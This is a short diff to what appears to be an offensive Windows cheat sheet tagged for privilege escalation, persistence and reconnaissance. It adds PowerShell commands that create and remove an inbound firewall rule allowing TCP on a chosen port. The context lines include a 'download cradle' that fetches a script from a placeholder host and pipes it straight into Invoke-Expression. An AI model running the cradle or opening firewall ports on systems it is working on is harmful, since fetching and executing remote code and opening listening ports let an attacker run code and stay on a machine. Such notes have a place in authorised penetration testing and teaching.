@@ -2,6 +2,18 @@
 
 #plateform/windows #target/local #cat/PRIVESC #cat/PERSIST #cat/RECON #tag/powershell 
 
+## Add new Firewall inbound rule
+
+```
+New-NetFirewallRule -DisplayName "<name-rule>" -Direction Inbound -Protocol TCP -Action Allow -LocalPort <port>
+```
+
+## Delete Firewall rule by name
+
+```
+Remove-NetFirewallRule -DisplayName "<name-rule>"
+```
+
 ## Download cradle
 ```powershell
 (new-object system.net.webclient).downloadstring('http://<ip>/<script>') | IEX
